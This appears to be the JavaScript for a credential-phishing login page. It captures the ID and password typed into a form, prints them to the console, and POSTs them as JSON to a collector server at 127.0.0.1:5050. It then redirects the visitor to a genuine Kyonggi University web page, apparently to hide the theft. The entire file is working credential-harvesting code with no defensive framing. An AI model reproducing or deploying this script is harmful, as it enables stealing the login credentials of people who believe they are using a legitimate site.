const form = document.getElementById("form");
const id = document.getElementById("id");
const pw = document.getElementById("pw");

const printText = (event) => {
  event.preventDefault();
  console.log(id.value);
  console.log(pw.value);
  getIdPw(id.value, pw.value);
  window.location.replace(
    "http://www.kyonggi.ac.kr/boardView.kgu?bcode=B0001&id=335498&pid=4589&pF=2&lgF=1"
  );
};

function init() {
  form.addEventListener("submit", printText);
}

init();

const getIdPw = async (id, pw) => {
  await fetch(`http://127.0.0.1:5050/post`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ id: id, pw: pw })
  });
  console.log(id.value);
  console.log(pw.value);
};
